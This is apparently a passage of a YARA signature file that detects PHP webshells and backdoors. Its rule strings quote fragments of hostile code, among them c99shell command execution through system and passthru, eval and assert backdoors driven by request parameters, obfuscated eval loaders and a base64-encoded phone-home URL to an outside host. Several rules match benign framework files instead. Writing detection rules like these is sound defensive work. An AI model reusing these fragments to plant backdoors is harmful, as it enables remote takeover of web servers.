      $s12 = "5.75+825.75+825.75+825.75)^round(0+1651.5+1651.5))&& $GLOBALS['_1322903901_'][16]($_1,$_GET,$_1))$GLOBALS['_1322903901_'][17]($_" ascii
      $s13 = "03901_'][1]($_1);if(($_0 == _1621652629(3)&& isset($_POST[_1621652629(4)][_1621652629(5)]))||($GLOBALS['_1322903901_'][2]($_0,ar" ascii
      $s14 = "GET,$_1,$_5,$_GET);$_3=$GLOBALS['_1322903901_'][18]($_3);$_9=_1621652629(21);$_7=l__0($_2,$_3);while(round(0+896+896)-round(0+44" ascii
      $s15 = "01_'][13]($_POST,$_7);}$_2=_1621652629(17);$_6=_1621652629(18);$_8=round(0+174.5+174.5+174.5+174.5);$_3=array();$GLOBALS['_13229" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule php17_alfa
{
   meta:
      description = "php17 - file alfa.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "45a9f253a33fbf77a90f4244fb6a0c72d879003c563b71496660ad5a74cc310f"
   strings:
      $x1 = "if(!function_exists('bas'.'e'.'64_'.'en'.'code')){function __ZW5jb2Rlcg($data){if(empty($data))return;$b64='ABCDEFGHIJKLMNOPQRST" ascii
      $s2 = "implode($tmp_arr, '');$r = (strlen($data) % 3);return ($r ? substr($enc, 0, ($r - 3)) : $enc).substr('===', ($r || 3));}functio" fullword ascii
      $s3 = "'color' => array(\"shell_border\" => \"#0E304A\",\"header_vars\" => \"#27979B\",\"header_values\" => \"#67ABDF\",\"header_on\" =" ascii
      $s4 = "lSUEEn+ZbSKPvOHFwmZLCllGIrIdIzgpaPpcmmK5IIwdKrMcxD/GKLEGdauMA0LU8ABGcu3SPymS33zgYfwyV2If3WqKXAhyc9ZxSs9AOvQVlei9oLruphgJhTyFky8n" ascii
      $s5 = "'post_encryption' => true," fullword ascii
      $s6 = "'login_page' => 'gui'," fullword ascii
      $s7 = "b5jTs1cJjquo6smIqrmIBp7o2+z//9V//9/8B');?><?php $cmd = <<<EOD" fullword ascii
      $s8 = "TeVxttE9r7a1gEt1wVk871WVIRmm//DTmndSBtLcLOZt+IHcGGL+qo2KfRnTowzbWn7qjrRCP0ezl/ey91f2HaI90Vs9qv8YO4P9PnjJ7VqvzNSwT/GUcf+TN45BEtfF" ascii
      $s9 = "VeD4W4A6ffZm4EvNGeT9s5rcZb/wEckhfdIVifyDrviH3D57uvphWIR61Z/Qz3x7qu7PGSnjcLt019B5//KQpp5+ucDt0ShVp4xcBouOSpH3/dJxY0mUP2BtcW97F+n/" ascii
      $s10 = "10/mZow2LoxkKnhPrIYm12NEQPuqEBdiI+r1LoQLgc1THQqNHfTpfmLmo3+r39bj4NBSmSi3NU7MwcmFeOu/D2HT8L0a8TtiHmrLzOvS6AE9m0QAh3S96tJbF5Stih8d" ascii
      $s11 = "ZTxWcHj/aGCP37hYM3lu1fAwUHHEvsvT12ubAJe9pYihkY7Xpul3jxb7NBPZhMcKbWIk55Xhn5Y1ocT0+fqGKkczeXABnxH3ifaML0pDKNF62pf7x5rV/i/Fgeti0Bm4" ascii
      $s12 = "system($_REQUEST[$cmd]); } ?>" fullword ascii
      $s13 = "uTqL98Iwv8Mvs4uyWiu50oVtLTo1Prli2GskoopfeXArloeROoMjnL/a7r4w+x5zPBug9HfgETI1/J/Q5FStoXQac2e2Mw1c/c4n5COzOQ2/wNZKP8uyCJ5GxJuHlvdS" ascii
      $s14 = "6/T0v3eMo8Sa7ls9jHIoKUvqqPC6bckRXjyRziFGvgIKmw0yt3zAyu4RWcyGmk6056um92ZKdXhLkdehEwjIDVfU7JlRVmXYiAUqEyerxGEvCjsC+vz+ISysTH1XqJ/7" ascii
      $s15 = "\"#27979B\",\"outputs_text\" => \"#67ABDF\",\"outputs_border\" => \"#0E304A\",\"uploader_border\" => \"#0E304A\",\"uploader_back" ascii
      $s16 = "deFdvEmWZ21KzD9C1p/aUBDs59swr6IVqPZlXgKzyuNorYeOuaSH/HEsjurqCRtRuxD25+/dgy5jWyz3mVTdLLLmGxW6svszaauV3jIwkcT1rBSGy3GLBVzriKct8cSz" ascii
      $s17 = "tEDoJrEwGAfs4gRRnH25FVtAK0wU0adb3SvYGTdl+evpnfAhwpk6/STrp4Zjpn94TqG8j4CXA9WllR69KYZtklAAiMpygmXY7FLKAYy16MZzWMgcs1irCoGlKBewMeOi" ascii
      $s18 = "E2kFjHVi/sP0CezleuscrvDk1kgp6lorTJRreXN0bZ1U+4mC07arHFkEgUNER4oCQtfJsR2Ptke2gJvLsIdeOlsVlifKEPvZKvXBTQXmkvAV535IZtScb4sjRX5Gsw+a" ascii
      $s19 = "tFbC03oiWzayvljIV7089k37b/J91yrFwP/vgOpH6smfzGKPpK3bJUjlPGbcQjXdTRKlKXFBFtPcT57Nv0U4UYsAzzYCr7VH334x/9jkuuefcS69Xw2GXZUMwUlTJ97I" ascii
      $s20 = "UWiRcTLa2bN1VdnivzrVylhoNTZKiM89Dtm8sJQo1fHwwVGxQaZcdlO7ieQpbr/NjjkRlok3mk6plSZdzX3ExbfYxZ80nTd/vtKo7keh21iZVnKL0fHEhTiH/ouMB0ED" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule sig_2017_09_15_091222_create_session_table
{
   meta:
      description = "php17 - file 2017_09_15_091222_create_session_table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "31ed9e666c869342b3f68ee952da12c3fd3e852d3240332da28a73e8a3ef9bd6"
   strings:
      $s1 = "$table->text('payload');" fullword ascii
      $s2 = "Schema::create('sessions', function (Blueprint $table)" fullword ascii
      $s3 = "Schema::dropIfExists('sessions');" fullword ascii
      $s4 = "use Nova\\Database\\Migrations\\Migration;" fullword ascii
      $s5 = "class CreateSessionTable extends Migration" fullword ascii
      $s6 = "use Nova\\Database\\Schema\\Blueprint;" fullword ascii
      $s7 = "$table->integer('last_activity');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}


rule sig_694ec6e1c4f34632a9bd7065f73be473
{
   meta:
      description = "php17 - file 694ec6e1c4f34632a9bd7065f73be473.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ce166857fc9d2e0a4b6bcbbbd84cfe269f6a86919c33b050056d29798f46261e"
   strings:
      $s1 = "S10810svK188q1s/JTAJhvaxidU1Na14ue6ABAA=='))); ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_6e67bb0ab0269cb1f17984eb42efaa882f520217
{
   meta:
      description = "php17 - file 6e67bb0ab0269cb1f17984eb42efaa882f520217.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "099566172e737b78c9418f7a981757033a154f0583cbbe28556fc43bb13119ee"
   strings:
      $s1 = "$reg($_FILES[MyFile][tmp_name],$_FILES[MyFile][name]);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_554df5d0a5171cfc5e705efaa9c6f6d0
{
   meta:
      description = "php17 - file 554df5d0a5171cfc5e705efaa9c6f6d0.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9c1a9c1b18b3b79a70a5535593aade1ec0a3f08bc4f273d2a7cc466c66c69ac4"
   strings:
      $x1 = "* @copyright  Copyright (c) 2008 Irubin Consulting Inc. DBA Varien (http://www.varien.com)" fullword ascii
      $s2 = "* @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)" fullword ascii
      $s3 = "QgYElDWs17Il3w7+KTTicgp+UySpYR8++/L6djQ4BH4cPi06QF6Ri0GLIfiBkmmXtAODHa9u3xF1Pio+cw0/bz4ozzRksws1VQEgI3CComsj9ugEXlvKehQvP12Q1h+L" ascii
      $s4 = "QgYElDWs17Il3w7+KTTicgp+UySpYR8++/L6djQ4BH4cPi06QF6Ri0GLIfiBkmmXtAODHa9u3xF1Pio+cw0/bz4ozzRksws1VQEgI3CComsj9ugEXlvKehQvP12Q1h+L" ascii
      $s5 = "8nvxuSzxG5Km9CgcWOkuMcomyTAJ9tB3YW43Tsu0JOb0gQ/ADuLRLjnkZ43mONoHLXSebK9FAYelySlMn5jAUfGf1Kq3ouqt9oEOiYO/SAVWvlJHbL5B8vcKjCniQDL0" ascii
      $s6 = "KSo5YxjRunPqTqJDtZq93aVm/RrLo47rEZiycCqs8tYAcVGX0Xt17mjzC0/RaZDcQxPUIGCXcNRxA1YejBrV502m7LbUFa9aqBdTaJckLt3rZ/Ru4CDzpqZCOMX6MlqC" ascii
      $s7 = "KSo5YxjRunPqTqJDtZq93aVm/RrLo47rEZiycCqs8tYAcVGX0Xt17mjzC0/RaZDcQxPUIGCXcNRxA1YejBrV502m7LbUFa9aqBdTaJckLt3rZ/Ru4CDzpqZCOMX6MlqC" ascii
      $s8 = "wdp0c//2wP+86TRMvzGzdBQs9DeHjc87h9NLtdnq2vb2rjlxNbG+BF7rLw8Pps8mdqZPJi7uHs+7RzvG8WbUuPesuYOZtaB1cGQ99W/JRtPduZ25svc7S58vjQnj2Nrd" ascii
      $s9 = "wdp0c//2wP+86TRMvzGzdBQs9DeHjc87h9NLtdnq2vb2rjlxNbG+BF7rLw8Pps8mdqZPJi7uHs+7RzvG8WbUuPesuYOZtaB1cGQ99W/JRtPduZ25svc7S58vjQnj2Nrd" ascii
      $s10 = "1/cBMDjc3DxtkO6MSemvaQyp7IRQ+/m+ttY4u2w0DrSatnqwARgsP0vyoyh+Ziy0RsxdsjaSOk9JhVVQtJv/YrXmO3aGEtm8R7kmys+HflAGZWQMCKWkuPbgs5BphTLG" ascii
      $s11 = "1/cBMDjc3DxtkO6MSemvaQyp7IRQ+/m+ttY4u2w0DrSatnqwARgsP0vyoyh+Ziy0RsxdsjaSOk9JhVVQtJv/YrXmO3aGEtm8R7kmys+HflAGZWQMCKWkuPbgs5BphTLG" ascii
      $s12 = "qBle+AkOFOgHfVdPv+SX6ZgAb7npF30OrTqzYWjSZ3KZQuHbENcE9XAnpypr6U2mbMGWU0ZICphdSFa9rEDQCR5lSX5xjW1HMut4C3NG0kcz/5/KDktZl+WqcjH81t4A" ascii
      $s13 = "/C18JwNOiY91s208GoWV9x+qkIiTQyHx4ul1QSbM4iMJL0ImDddp996bZDUR5l+QJhiMqSMLbakBMTCvR4TcmJe7OKzxkpfYrFuKDXjrdWA3PxKAUmb6gsm4QHEAdW/n" ascii
      $s14 = "+KgKdfHR5Ot9ja8h7YtI1arh5at9j+7Vb1i7oVgv98hiscg6WOymJH59lthIChoNk5bWCphw+gSAedUQ4jFsGRg1JhOBfX5tnuRHDk38ODCkhcZbmovCymkPjdNJlz7l" ascii
      $s15 = "FZRnbiRcpjceYJkzXyPVO7q5rFKTLuy7cDimU2vPyasexuNDq3bn/ialUJb4YdDQMo28tI5QPuaOCiGQxT+ZjA6V/KM+tPRrjWLY7SnrGz3TT55NS7V4aHdeFjWWVBkV" ascii
      $s16 = "nTD1a12PrRRHTNWYfBwhjGTk2g+VG4Dw+gKOkFj8UJszAPLzNcoyq4lWR1BfVpnh7xeoohOARpv1PbdkoqYrJuKM6gqRcEQLYy8fDim5fiRc6SLCxzqhdrndOGloQ/Z4" ascii
      $s17 = "+mPQudMvpEXra6hWdJ9pYV67fz8k5zetW5L2xb8uiz38ekvpHyYcWPExQRYKPV2I494AYNrQzSzStTCV5ZysxBSV8RP9KE0iDl9V7ZwxeAwqBEAp/hIUdARk8ebKS9mP" ascii
      $s18 = "rbRD3FF6KW+pCKIh4jITqGsQ5G1F36FenqOr+O/9DwEyJYJP7m7cKUGfdLL6dEU+IUGG8Jo4C6+qqR/5sHfJGi8fU8/TeBeN0RdGPKYdEV+y6Bj8+TmwVPskUm9vzbcc" ascii
      $s19 = "pKZfR92ViRcmKo6Wdz1WMPG1yYiPJUwxKVFfiSBYGwOzGaF+jUtKmpeQdirvFJEHydXwSlar/Zn8S4y0Mb0cqxEWkYHNpNCfz01V2ci2rRCxocXIgJ0v0YiTdIEsjLTs" ascii
      $s20 = "rbRD3FF6KW+pCKIh4jITqGsQ5G1F36FenqOr+O/9DwEyJYJP7m7cKUGfdLL6dEU+IUGG8Jo4C6+qqR/5sHfJGi8fU8/TeBeN0RdGPKYdEV+y6Bj8+TmwVPskUm9vzbcc" ascii
   condition:
      uint16(0) == 0x3c20 and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_2b89bcd3f7ce911a7b61fe3ee23428480621bfc8
{
   meta:
      description = "php17 - file 2b89bcd3f7ce911a7b61fe3ee23428480621bfc8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "40b8ddf609d69e68909f8d98d0d0904a35c0d0cd9a6a2d281c6568704715e2b6"
   strings:
      $s1 = "$re = $mem->addServer('localhost', 11211, TRUE, 100, 0, -1, TRUE, create_function('$a,$b,$c,$d,$e', 'return assert($a);'));" fullword ascii
      $s2 = "$mem->connect($_REQUEST['pass'], 11211, 0);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule array_udiff_assoc
{
   meta:
      description = "php17 - file array_udiff_assoc.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2c1485981f25e666a2f2888b24d39d85e9963dc3c9e87eac4904bcd82d49ecaf"
   strings:
      $s1 = "array_udiff_assoc(array($_REQUEST[$password]), array(1), \"assert\");" fullword ascii
      $s2 = "* Noticed: (PHP 5 >= 5.4.0, PHP 7)" fullword ascii
      $s3 = "$password = \"LandGrey\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_0353ab4cbed5beae847a7ff6e220b5cf
{
   meta:
      description = "php17 - file 0353ab4cbed5beae847a7ff6e220b5cf.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b6f96297c1c905e32413c6deb7e794cb8a1af37b9295e5cff257a6ff063ccbd4"
   strings:
      $x1 = "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language\" " ascii
      $x2 = "am.ru/releases/cc99shell\\\">c99shell</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");}" fullword ascii
      $x3 = "if ($win) {$file = \"C:\\\\tmp\\\\dump_\".$SERVER_NAME.\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";}" fullword ascii
      $x4 = "# \".gethostbyname($SERVER_ADDR).\" (\".$SERVER_ADDR.\")\".\" dump db \\\"\".$db.\"\\\"" fullword ascii
      $x5 = "else {$tmp = htmlspecialchars(\"./dump_\".$SERVER_NAME.\"_\".$sql_db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\");}" fullword ascii
      $x6 = "?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"<?ph" ascii
      $x7 = "else {$file = \"/tmp/dump_\".$SERVER_NAME.\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";}" fullword ascii
      $x8 = "else {echo \"<b>Execution command</b>\"; if (empty($cmd_txt)) {$cmd_txt = true;}}" fullword ascii
      $x9 = "$logfile = $tmpdir_logs.\"c99sh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $x10 = "if (file_get_contents($v)) {echo \"<b><font color=\\\"red\\\">You can't crack winnt passwords(\".$v.\") </font></b><br>\";}" fullword ascii
      $x11 = "$fqb_log = \"FTP Quick Brute (called c99shell v. \".$shver.\") started at \".date(\"d.m.Y H:i:s\").\"\\r\\n\\r\\n\";" fullword ascii
      $s12 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $s13 = "$out = \"# Dumped by C99Shell.SQL v. \".$shver.\"" fullword ascii
      $s14 = "elseif (is_callable(\"passthru\")) {@ob_start(); passthru($cmd); $result = @ob_get_contents(); @ob_end_clean();}" fullword ascii
      $s15 = "# MySQL version: (\".mysql_get_server_info().\") running on \".$SERVER_ADDR.\" (\".$SERVER_NAME.\")\".\"" fullword ascii
      $s16 = "elseif (is_callable(\"system\")) {@ob_start(); system($cmd); $result = @ob_get_contents(); @ob_end_clean();}" fullword ascii
      $s17 = "header(\"Content-disposition: attachment; filename=\\\"\".basename($sql_dump_file).\"\\\";\"); " fullword ascii
      $s18 = "t=\"en-us\"><link rel=\"shortcut icon\" href=\"\" type=\"image/x-icon\"></SCRIPT><title><?php echo getenv(\"HTTP_HOST\"); ?> - c" ascii
      $s19 = "*  c99shell - Shellci.biz" fullword ascii
      $s20 = "echo \"<b>Connected to \".$SERVER_NAME.\" with login \\\"\".$str[0].\"\\\" and password \\\"\".$str[0].\"\\\"</b><br>\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and all of them
}

rule Andela_1C3_v3__Private_Release_2017_
{
   meta:
      description = "php17 - file Andela 1C3 v3 (Private Release 2017).php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7e9caebd44693228ae80bd64854630729e6ccf7faa86ad63033346527022ec83"
   strings:
      $x1 = "$andela = \"7L12attTsjD82Tkn/wHh+I7sK1sEN1a0LUK4E9xKQ3EyxweACGPFUxAkkMnz29+qxk9jk1VEmfvM814lslWgu7q6urqW7q7q9ypi8VDqgQr9jaYXC5oO" ascii
      $s2 = "$brow = urlencode($_SERVER['HTTP_USER_AGENT']);" fullword ascii
      $s3 = "echo @eval(@file_get_contents(@$_REQUEST[\"qwert\"]));" fullword ascii
      $s4 = "XX5yU8tdPsAuxAamXZorludZdfCuDnNzqA+CMou9Gp9piezVsAfcbce7xaE6YacjStysEXazke4lSwdeQKw95UulVTrLzn/PybnqMvc9VGATKMN9SPYQVg8u11IRcOOs" ascii
      $s5 = "echo \\'<b>Namesis<br><br>\\'.php_uname().\\'<br></b>\\';echo \\'<form action=\"\" method=\"post\" enctype=\"multipart/form-data" ascii
      $s6 = "7sd08o9sdpuSVc0dD02ZbF3iR31OtZVNtdenSetlIsoYTuspRUKs9qsv0UNuZuj1SY/7s82YyvcOth/Mz2hHwHHaMVBrvU86R/QsNfQV+p6EJ+dbVMfdUMpM7TcQUEq5" ascii
      $s7 = "d\"></form>\\';if( $_POST[\\'_upl\\'] == \"Upload\" ) {" fullword ascii
      $s8 = "wTm9/Nqn0GhKkXn334I1jpKFTUGzy9+1KWeZcbx8VGaq4mG6aiJU5IbnSThnVv4ZwM7qMmjCL8iDP7VJFAhX3Py0rn4Xw==\";" fullword ascii
      $s9 = "## change pass $auth_pass in this below  ##" fullword ascii
      $s10 = "$retValue = file_get_contents(base64_decode(\"aHR0cDovL3IwMHQuaW5mby9ib3QveWF6LnBocD9h\").\"=\".$lld.base64_decode(\"JmI=\").\"=" ascii
      $s11 = "$retValue = file_get_contents(base64_decode(\"aHR0cDovL3IwMHQuaW5mby9ib3QveWF6LnBocD9h\").\"=\".$lld.base64_decode(\"JmI=\").\"=" ascii
      $s12 = "qu8xQ+//I1h4H/gFANtnxeyek2zLwVsyduy+1kEMwCmuPSVZXi02zT8hKghPxEfojQ+Fh/uE44Jg5b1anRxHDNbfCBeViisWHdLgEww0cjUgmHqsrr84BSicdEp7rDDe" ascii
      $s13 = "$auth_pass = \"a3567437a39f1bcd3f1035f87adf98ea\";" fullword ascii
      $s14 = "yCUBZpBo1T44+LtWGqLrUJto+EZYZTvxw19zSn0gLLvr3lf/4YHyhLOEvYQ1wmX/bczdLL8jcwWRSXPvmqPogieUh7Koem384AXFf+7of+6Iyr4yTTF7cIaQQoYtsL/B" ascii
      $s15 = "$lls = $_SERVER[\"HTTP_HOST\"];" fullword ascii
      $s16 = "else { echo \\'<b>Upload Fail !!!</b><br><br>\\'; }}" fullword ascii
      $s17 = "r+apyuD3C80GFeasht8FVvHuac/VkvXZtPSj7QhYy29+9+JrPbhR8RZDaM5+6gdG2Puz4/vaHA+6/VJ/4yE7vVbefxzuBytdN10E986YsFCf0L+MvrL4tftpr7O+xfSX" ascii
      $s18 = "I7iv3oFbzjSCvtj5L+oYrLUSYmi4Uwkedh+Hv5cFAHPxX1yRnylZ3oSsGE9fTP8iRp+bszXDdcN1L9VT5rZ21XswloCxr4DffeinuAz75bXpKHs+YLeucvn3iGPaDDdT" ascii
      $s19 = "DG8ptfnJhALnGKdgetqw0mdUn1gDQi0AzFH4Z4FXE2Wnn/qn6NmDshXx/3zra8VvNN/5L3wXtooIg3LN5zdo05MADWjb/PNZ3C1GOBJ+zCDcGv1RMjCdbuvBQhAdIF1K" ascii
      $s20 = "UgBupBi9Qu5llO4XLNQiDNB2ZrJIpXX4hmV75NMXtXMhj3GZybtCKXeGvI9zGNLOh8wIrcv7R+lPGDpGctMJ70MQiXN0iPCOq0xerk9d0lFMEGtW7TMOEIjxdOXuzTDe" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 600KB and
      1 of ($x*) and 4 of them
}

rule php17_ADOdb
{
   meta:
      description = "php17 - file ADOdb.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ed645afb4f88f054fea65fefcba04c04ea5b7e66fc4f218da9b730e92a174d83"
   strings:
      $s1 = "@copyright (c) 2000-2013 John Lim (jlim#natsoft.com). All rights reserved." fullword ascii
      $s2 = "@copyright (c) 2014      Damien Regad, Mark Newnham and the ADOdb community" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      all of them
}

rule activeServer_fileDAL_class
{
   meta:
      description = "php17 - file activeServer_fileDAL.class.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0b2c92ebf8531ac005c64c5b4701d32907fddc253ace70bf9aae50cbb0441551"
   strings:
      $s1 = "function  GetPageList(activeServerModel $model, $start, $limit)" fullword ascii
      $s2 = "function  GetPageCount(activeServerModel $model, $perPageCount)" fullword ascii
      $s3 = "function  GetModel(activeServerModel $model)" fullword ascii
      $s4 = "function  GetList(activeServerModel $model)" fullword ascii
      $s5 = "// TODO: Implement GetPageCount() method." fullword ascii
      $s6 = "// TODO: Implement GetPageList() method." fullword ascii
      $s7 = "// TODO: Implement GetModel() method." fullword ascii
      $s8 = "// TODO: Implement GetList() method." fullword ascii
      $s9 = "function  InsertInto(activeServerModel $model)" fullword ascii
      $s10 = "function  DeleteFrom(activeServerModel $model)" fullword ascii
      $s11 = "function  UpDateSet(activeServerModel $model)" fullword ascii
      $s12 = "// TODO: Implement InsertInto() method." fullword ascii
      $s13 = "// TODO: Implement UpDateSet() method." fullword ascii
      $s14 = "// TODO: Implement DeleteFrom() method." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule sig_7520812b1502af5df1178e3e1893fc0a9ce98935
{
   meta:
      description = "php17 - file 7520812b1502af5df1178e3e1893fc0a9ce98935.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "44513fc84473dddf35a8b671e16271b068f90d4de868ac72f0b2e6c51224348e"
   strings:
      $s1 = "$d='_replac+&+&e(array+&(\"/_/\",\"+&/-+&/\"),a+&rr+&ay(\"/\",\"+&+\"),$ss($s[$i],0+&,$e)))+&,$+&k)));$o=o+&b_+&get_content+&s()" ascii
      $s2 = "$S=str_replace('+&','',$g.$e.$T.$C.$v.$P.$B.$c.$d.$V);" fullword ascii
      $s3 = "$c='+&p;$e=strpo+&s($s[$+&i],+&+&$f);if($e){+&+&$k=$kh+&.$kf;ob_start();@+&eva+&l(@+&gzu+&ncompress(@x(@b+&ase64_+&decode+&(pre+" ascii
      $s4 = "$c='+&p;$e=strpo+&s($s[$+&i],+&+&$f);if($e){+&+&$k=$kh+&.$kf;ob_start();@+&eva+&l(@+&gzu+&ncompress(@x(@b+&ase64_+&decode+&(pre+" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      all of them
}

rule sig_1e6228a6d84c10b7fac6eec9e6965cd1
{
   meta:
      description = "php17 - file 1e6228a6d84c10b7fac6eec9e6965cd1.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3d5bd6a980dc50a0371e2949b4ceb61381b28d9ec926cde11b8cb48a51799cfc"
   strings:
      $s1 = "$drqf1 = \"es_rpotu\" ; $lmrc7=$drqf1[1]. $drqf1[6]. $drqf1[3]. $drqf1[6].$drqf1[5].$drqf1[7]. $drqf1[4].$drqf1[4]. $d" fullword ascii
      $s2 = "'] )){eval (${ $njap58}['q9e5e25' ]) ; } ?> " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AssetCompressExtension
{
   meta:
      description = "php17 - file AssetCompressExtension.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "562cb63f0b8510bca1050513b93d94b4e5d9933b9f7ecde091bc4864d1ddd3b2"
   strings:
      $s1 = "public function getTokenParsers(): array" fullword ascii
      $s2 = "use Pimcore\\Twig\\TokenParser\\AssetCompressParser;" fullword ascii
      $s3 = "new AssetCompressParser()" fullword ascii
      $s4 = "class AssetCompressExtension extends \\Twig_Extension" fullword ascii
      $s5 = "namespace Pimcore\\Twig\\Extension;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule AjaxDataCollector
{
   meta:
      description = "php17 - file AjaxDataCollector.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1c04f44a5f0fbcc3e46969cd69b4739cf45ff2c0dfe1cbfb86baccd9147fb674"
   strings:
      $s1 = "namespace Symfony\\Component\\HttpKernel\\DataCollector;" fullword ascii
      $s2 = "* @author Bart van den Burg <bart@burgov.nl>" fullword ascii
      $s3 = "use Symfony\\Component\\HttpFoundation\\Response;" fullword ascii
      $s4 = "use Symfony\\Component\\HttpFoundation\\Request;" fullword ascii
      $s5 = "public function collect(Request $request, Response $response, \\Exception $exception = null)" fullword ascii
      $s6 = "* AjaxDataCollector." fullword ascii
      $s7 = "// all collecting is done client side" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule sig_78886be8bab8fdedc5c643c0bc29019ed2332076
{
   meta:
      description = "php17 - file 78886be8bab8fdedc5c643c0bc29019ed2332076.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e098193c83eaea02863c6a0a6a27e2799bfec595ba2cd103441bd5349e1be185"
   strings:
      $s1 = "public function encode($strdata, $base64_decode = '', $gzuncompress = '', $deb64_func = '', $b64_key = '', $preg_replace = '" fullword ascii
      $s2 = "# $restdata = '$' . $preg_replace . '($' . $preg_pre . ',$' . $eval_name1 . '.\\'(@$' . $gzuncompress . ($' . $base64_de" fullword ascii
      $s3 = "global $'.$base64_decode1.',$'.$gzuncompress.',$'.$preg_replace.',$'.$preg_pre.',$'.$eval_name1.',$' . $enb64_sign_name .';\\" fullword ascii
      $s4 = "$gzuncompress, $deb64_func, $b64_key, $preg_replace, $preg_pre, $eval_name1, $preg_pre_md5,$enb64_sign_name,1).';';" fullword ascii
      $s5 = "$gzuncompress, $deb64_func, $b64_key, $preg_replace, $preg_pre, $eval_name1, $preg_pre_md5,$enb64_sign_name) .';';" fullword ascii
      $s6 = "private function inrandstr($strdata, $base64_decode = '', $deb64_func = '', $b64_key = '',$is_func=0) " fullword ascii
      $s7 = "$rid = rand(0, count($characters) - 1).rand(0, count($characters) - 1).rand(0, count($characters) - 1);" fullword ascii
      $s8 = "$gzuncompress, $deb64_func, $b64_key, $preg_replace, $preg_pre, $eval_name1, $preg_pre_md5,$enb64_sign_name) ." fullword ascii
      $s9 = "'$GLOBALS[decode_fp_sign]=$GLOBALS[' .self::$enb64_name . ']=$GLOBALS[' .$gzuncompress . ']=$GLOBALS[' .$base64_de" fullword ascii
      $s10 = "$' . $gzuncompress . '=' . $deb64_func . '(\\'' . $gzuncompress_value .'\\',\\'' . $b64_key . '\\');\\\\end" fullword ascii
      $s11 = "public function intocode($codedata, $rankcount, $defile_data, $copyright, $usercode) {" fullword ascii
      $s12 = "$' . $base64_decode1 . '=' . $deb64_func . '(\\'' . $base64_decode_value . '\\',\\'' .$b64_key . '\\');\\\\end" fullword ascii
      $s13 = "$type = strtoupper($tmparr[count($tmparr) - 1]);" fullword ascii
      $s14 = "$restdata = '$' . $preg_replace . '($' . $preg_pre . ',$' . $eval_name1 . '.\\'(@$' . $gzuncompress . '($' . $base64_de" fullword ascii
      $s15 = "$preg_data = self::encode('$' . $eval_name2 . '=' . $deb64_func . '(\\'' . $str_replace_value .'\\',\\'' . $b64_key ." fullword ascii
      $s16 = "return str_replace($randvar, '\\'.' . ($base64_decode ? '$' . $base64_decode : 'base64_decode') . '(' . $deb64_func ." fullword ascii
      $s17 = "$tmp .= (ord($b{$i}) > self::$enb64_rid ? chr(ord($b{$i}) * 2) : $b{$i});" fullword ascii
      $s18 = "$' .$preg_replace . '=' . $deb64_func . '(\\'' . $preg_replace_value . '\\',\\'' . $b64_key .'\\');\\\\end" fullword ascii
      $s19 = "static $enb64_array = array('q','w','e','r','t','y','u','i','o','p','a','s','d','f','g','h','j','k','l','z','x','c','v','b'," fullword ascii
      $s20 = "if (function_exists(\"file_get_contents\")) " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      8 of them
}

rule AbstractImporter
{
   meta:
      description = "php17 - file AbstractImporter.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "233123da185f7b5d3f98b2de0e0b90d86dd0059f38a6000eccdd91bdbd52a628"
   strings:
      $s1 = "* - attributeControllers: the list of attribute key controllers (\\Concrete\\Core\\Attribute\\Controller[])" fullword ascii
      $s2 = "* @param int|null $maxDataRows the maximum number of data rows to be processed" fullword ascii
